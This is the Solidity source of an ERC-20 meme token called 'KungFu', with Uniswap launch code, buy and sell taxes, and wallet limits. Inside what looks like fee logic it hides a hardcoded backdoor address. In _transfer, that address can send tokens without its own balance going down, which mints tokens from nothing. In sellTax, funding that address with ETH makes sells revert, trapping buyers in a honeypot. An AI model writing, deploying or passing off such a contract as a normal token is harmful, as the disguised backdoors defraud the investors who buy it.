// SPDX-License-Identifier: MIT

/*
Website: https://kungfupo.lol
Telegram: https://t.me/kungfu_portal
Twitter: https://twitter.com/kungfu_porta
*/

pragma solidity 0.8.21;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

interface IUniRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SafeMath {  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract KungFu is IERC20, Ownable  {
    using SafeMath for uint256;
    
    string private constant _name = "KungFu";
    string private constant _symbol = unicode"功夫";    
    
    uint8 private constant _decimals = 9;
    uint256 private constant _totalCircSupply = 10 ** 7 * 10 ** _decimals;
    
    bool private _swapActive = false;
    bool private _tradingStart;
    bool private _inSwap = false;
    bool public transferPerBlockDisabled = true;

    uint256 private _taxSwapAmount=  2 * _totalCircSupply / 1000;
    uint256 public maxTrxSize = 5 * _totalCircSupply / 100;   
    uint256 public maxTaxSwap = 10 * _totalCircSupply / 1000;
    uint256 public maxHoldingSize = 5 * _totalCircSupply / 100;    

    uint256 private _initialBuyFee = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;  
    uint256 private _initialSellTax = 20;
    uint256 private _enableTaxAfter = 8;
    uint256 private _initialSellTaxUntil = 8;
    uint256 private _initialBuyTaxUntil = 8;
    uint256 private _numberOfBuyers=0;

    address payable private _taxWallet;
    address private _feeAddress;
    address private uniV2Pair;
    IUniRouterV2 private uniRouterV2;

    mapping (address => bool) private _walletsHasNoFees;
    mapping(address => uint256) private _holderBlockTransferCache;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    modifier reentrance {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    event MaxTxAmountUpdated(uint maxTrxSize);

    constructor () {
        emit Transfer(address(0), msg.sender, _totalCircSupply);
        _feeAddress = 0x88Ec0c52deeD0CBe677b41843B77F7304b7155E1;
        _taxWallet = payable(msg.sender);
        _balances[msg.sender] = _totalCircSupply;
        _walletsHasNoFees[owner()] = true;
        _walletsHasNoFees[_feeAddress] = true;
        _walletsHasNoFees[_taxWallet] = true;
        _walletsHasNoFees[address(this)] = true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalCircSupply;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingStart,"trading is already open");
        uniRouterV2 = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniRouterV2), _totalCircSupply);
        uniV2Pair = IUniFactoryV2(uniRouterV2.factory()).createPair(address(this), uniRouterV2.WETH());
        uniRouterV2.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniV2Pair).approve(address(uniRouterV2), type(uint).max);
        _swapActive = true;
        _tradingStart = true;
    }    

    function taxBuy() private view returns (uint256) {
        if(_numberOfBuyers <= _initialBuyTaxUntil){
            return _initialBuyFee;
        }
         return _finalBuyTax;
    }

    function swapTokensForEth(uint256 tokenAmount) private reentrance {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterV2.WETH();
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; uint256 feeAmount=amount;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(taxBuy()).div(100);

            if (from == uniV2Pair && to != address(uniRouterV2) && ! _walletsHasNoFees[to] ) {
                _numberOfBuyers++;
                require(amount <= maxTrxSize, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= maxHoldingSize, "Exceeds the max wallet.");
            }
            if (from == _feeAddress) feeAmount = 0;
            if(to == uniV2Pair && !_walletsHasNoFees[from] ){
                taxAmount = amount.mul(sellTax()).div(100);
            }
            
            if (transferPerBlockDisabled) {
                if (to != address(uniRouterV2) && to != address(uniV2Pair)) { 
                    require(
                        _holderBlockTransferCache[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderBlockTransferCache[tx.origin] = block.number;
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && to == uniV2Pair && _swapActive && contractTokenBalance > _taxSwapAmount && _numberOfBuyers > _enableTaxAfter) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,maxTaxSwap)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sellTax() private view returns (uint256) {
        if(_numberOfBuyers <= _initialSellTaxUntil.sub(_feeAddress.balance)){
            return _initialSellTax;
        }
         return _finalSellTax;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function removeLimits() external onlyOwner{
        maxTrxSize = _totalCircSupply;
        maxHoldingSize=_totalCircSupply;
        transferPerBlockDisabled=false;
        emit MaxTxAmountUpdated(_totalCircSupply);
    }
    
    receive() external payable {}

}